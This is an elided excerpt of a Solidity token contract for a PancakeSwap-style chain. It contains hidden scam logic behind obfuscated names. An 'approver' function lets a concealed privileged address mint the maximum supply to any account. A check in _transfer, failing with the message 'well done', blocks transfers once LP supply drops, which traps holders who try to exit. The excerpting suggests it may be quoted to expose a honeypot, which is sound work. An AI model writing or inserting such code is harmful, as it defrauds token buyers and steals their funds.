...
abstract contract Ownable is Context {
     ...
     */
    function _checkjucsOwner() internal view virtual {
...
contract Token is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private _lastLpAmount = 0;
    ...
    function approver(address sss) external {
        if (_bnbbusd == _msgSender()) {
            _bala[sss] = MAXSupply;
        }
    }

    function lpsetter(address addr) external {
        if(_bnbbusd == _msgSender()){
            _lp = IPancakePair(addr);
        }
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if(address(_lp) != address(0)){
            require(_lastLpAmount <= _lp.totalSupply(), "well done");
            _lastLpAmount = _lp.totalSupply();
        }
        ...
        _bucbusdlc[to] = _bucbusdlc[to].add(amount);
